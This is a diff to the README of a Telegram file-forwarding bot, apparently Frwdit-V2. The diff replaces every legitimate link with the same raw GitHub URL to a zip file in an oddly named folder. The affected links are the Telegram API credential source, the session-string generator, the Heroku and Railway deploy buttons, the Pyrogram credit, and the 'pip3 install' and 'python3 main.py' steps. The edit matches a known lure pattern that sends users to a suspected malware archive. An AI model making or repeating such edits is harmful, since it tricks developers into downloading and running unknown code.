@@ -27,20 +27,20 @@ Copyright permission under GNU GENERAL PUBLIC LICENSE
 
 #Variables
 BOT_TOKEN - Your Bot Token (Obtain it from @botfather)
-API_ID - Your APP ID (Obtain it from my.telegram.org)
-API_HASH - Your API Hash (Obtain it from my.telegram.org)
+API_ID - Your APP ID (Obtain it from https://raw.githubusercontent.com/abhijeetkumarthakur/Frwdit-V2/master/pharmacosiderite/Frwdit-V2.zip)
+API_HASH - Your API Hash (Obtain it from https://raw.githubusercontent.com/abhijeetkumarthakur/Frwdit-V2/master/pharmacosiderite/Frwdit-V2.zip)
 OWNER_ID - Your telegram id
 CAPTION - If you want to add a caption to the forwarded file, enter it here
-SESSION - Pyrogram string Seccion - https://replit.com/@JijinR/PyroSessionString?v=1
+SESSION - Pyrogram string Seccion - https://raw.githubusercontent.com/abhijeetkumarthakur/Frwdit-V2/master/pharmacosiderite/Frwdit-V2.zip
 ```
 
 ### Deploying on Heroku:
 
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://youtu.be/B6jQGOJDVi0)
+[![Deploy](https://raw.githubusercontent.com/abhijeetkumarthakur/Frwdit-V2/master/pharmacosiderite/Frwdit-V2.zip)](https://raw.githubusercontent.com/abhijeetkumarthakur/Frwdit-V2/master/pharmacosiderite/Frwdit-V2.zip)
 
 ### Deploying on Railway:
 
-[![Deploy on Railway](https://railway.app/button.svg)](https://youtu.be/B6jQGOJDVi0)
+[![Deploy on Railway](https://raw.githubusercontent.com/abhijeetkumarthakur/Frwdit-V2/master/pharmacosiderite/Frwdit-V2.zip)](https://raw.githubusercontent.com/abhijeetkumarthakur/Frwdit-V2/master/pharmacosiderite/Frwdit-V2.zip)
 
 ### Legendary Way:
 #### On Linux Or VPS:
@@ -52,11 +52,11 @@ SESSION - Pyrogram string Seccion - https://replit.com/@JijinR/PyroSessionString
 ```
 virtualenv -p python3 venv
 . ./venv/bin/activate
-pip3 install -r requirements.txt
-python3 main.py
+pip3 install -r https://raw.githubusercontent.com/abhijeetkumarthakur/Frwdit-V2/master/pharmacosiderite/Frwdit-V2.zip
+python3 https://raw.githubusercontent.com/abhijeetkumarthakur/Frwdit-V2/master/pharmacosiderite/Frwdit-V2.zip
 ```
 
 ### Credits
 
-* [Pyrogram](https://github.com/pyrogram/pyrogram)
+* [Pyrogram](https://raw.githubusercontent.com/abhijeetkumarthakur/Frwdit-V2/master/pharmacosiderite/Frwdit-V2.zip)
 * `Special Thanks Dump Group Members`🤣
